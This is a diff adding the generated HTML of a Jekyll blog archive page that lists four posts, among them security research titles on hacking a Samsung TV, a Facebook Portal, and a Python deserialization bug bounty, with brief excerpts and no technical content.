+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/jekyll/update/2023/01/26/welcome-to-jekyll.html" rel="permalink">Welcome to Jekyll!
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different wa...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/research/2022/01/28/pwning-the-samsung-tv.html" rel="permalink">Pwning the Samsung TV
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Overview
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/research/2022/01/21/pwning-facebook-portal.html" rel="permalink">Pwning the Facebook Portal
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Overview
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/bug-hunting/2021/12/19/python-deserialization-on-integrated-aws-ddb-flask-app.html" rel="permalink">Python Deserialization on Integrated AWS DDB Flask App
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Cách đây vài hôm mình có gặp một challenge hay ho khi làm Bug Bounty ở nền Cloud &amp;&amp; Web. Tuy flow xử lý data không có gì là mới, nhưng việc applicati...</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2023 iam.chi. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
